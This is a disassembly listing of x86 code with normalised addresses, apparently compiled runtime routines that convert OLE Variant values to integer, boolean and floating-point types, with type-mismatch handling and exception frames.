jmp r-xdata
call sub_40315c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40315c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40315c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40315c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40315c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40315c
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40fd60
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fcc0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_40fcc0
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_40fffb ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_4029ec
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_4029ec
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_4029ec
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_4029ec
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fc0c
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40fda4
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40315c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40315c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40315c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40315c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40315c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40315c
sub_4101f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x10
mov ax 0x1
call sub_40e990
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x5
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_410280
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fda4
mov ebx eax
add ebx 0x80
cmp ebx 0xff
jbe r-xdata
add ebx 0xffffff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_40315c
sub_4102a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x11
mov ax 0x1
call sub_40e990
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x6
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_410327
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fda4
mov ebx eax
cmp ebx 0xff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_40315c
sub_41034c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
xor eax eax
push ebp
push sub_410420
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fda4
mov ebx eax
add ebx 0x8000
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_410372 ]
jmp [ eax * 4 + jump_table_410384 ]
add ebx 0xffff8000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_40315c
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x2
mov ax 0x1
call sub_40e990
sub_410444
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
xor eax eax
push ebp
push sub_4104f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fda4
mov ebx eax
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_410466 ]
jmp [ eax * 4 + jump_table_410479 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_40315c
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x12
mov ax 0x1
call sub_40e990
sub_41051c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x13
ja r-xdata
xor eax eax
push ebp
push sub_4105e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410868
test edx edx
je r-xdata
mov al [ eax + lookup_table_410542 ]
jmp [ eax * 4 + jump_table_410556 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_40315c
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_40e990
sub_410604
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ esp + 0x10 ]
call sub_4029ec
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
mov dx [ ebx ]
mov cx 0x14
call sub_40edd0
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_410e64
and eax 0x7f
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
sub_4106b0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41079e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412e2c
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4041f4
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_4083f0
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4107a5
lea eax [ ebp - 0x1c ]
call sub_403f6c
lea eax [ ebp - 0xc ]
call sub_404678
retn
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ ebp - 0x18 ]
call sub_4029ec
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov dx [ ebx ]
mov cx 0x14
call sub_40edd0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax ebx
call sub_410e64
and eax 0x7f
xor edx edx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_4107b0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410807
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f49c
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_410868
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41080e
lea eax [ ebp - 0x18 ]
call sub_40f174
retn
sub_41081c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415800
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x14
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_410868
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_410c74
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41089b ]
mov eax [ ebp - 0x4 ]
call sub_4106b0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_4029ec
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_4029ec
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_4029ec
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_4029ec
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4106b0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410868
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410604
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4107b0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x14
mov ax 0x1
call sub_40e990
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41081c
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_410604
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_410604
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_410abf ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_4029ec
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_4029ec
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_4029ec
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_4029ec
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4106b0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410868
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_410cac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410d63
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412e2c
lea eax [ ebp - 0xa ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4041f4
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x1 ]
call sub_4084dc
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410d6a
lea eax [ ebp - 0x10 ]
call sub_403f6c
lea eax [ ebp - 0x8 ]
call sub_404678
retn
mov dx [ ebx ]
mov cx 0xb
mov eax 0x80020005
call sub_40edd0
jmp r-xdata
mov dx [ ebx ]
mov cx 0xb
call sub_40edd0
cmp [ ebp - 0xa ] 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
jmp r-xdata
sub_410d74
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0xb
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0xb
call sub_40edd0
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
add esp 0x10
pop ebx
retn
sub_410db4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410e08
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x11 ]
call sub_40f49c
lea eax [ ebp - 0x11 ]
call [ rw-data ]
lea eax [ ebp - 0x11 ]
call sub_410e64
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410e0f
lea eax [ ebp - 0x11 ]
call sub_40f174
retn
sub_410e18
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415800
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0xb
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
cmp [ esp + 0xc ] 0x1
sbb eax eax
inc eax
mov [ edi ] al
sub_410e64
push ebx
push ecx
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410e7e ]
mov eax ebx
call sub_410cac
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fild [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410cac
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410e64
mov [ esp ] al
jmp r-xdata
mov eax ebx
call sub_410d74
mov [ esp ] al
jmp r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_410db4
mov [ esp ] al
jmp r-xdata
jmp r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov dx 0xb
mov ax 0x1
call sub_40e990
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_410e18
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_410d74
mov [ esp ] al
mov eax ebx
call sub_410d74
mov [ esp ] al
jmp r-xdata
jmp [ eax * 4 + jump_table_411040 ]
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410cac
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410e64
mov [ esp ] al
jmp r-xdata
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
sub_4111b8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41126d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412e2c
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4041f4
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_409720
test al al
je r-xdata
sub edx 0x7ffdfffb
jne r-xdata
mov dx [ ebx ]
mov cx 0x5
mov eax 0x80020005
call sub_40edd0
jmp r-xdata
fld [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov dx [ ebx ]
mov cx 0x5
call sub_40edd0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411274
lea eax [ ebp - 0x1c ]
call sub_403f6c
lea eax [ ebp - 0xc ]
call sub_404678
retn
sub_41127c
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x5
call sub_40edd0
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_4112c8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41131d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f49c
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411378
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411324
lea eax [ ebp - 0x18 ]
call sub_40f174
retn
sub_41132c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415800
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
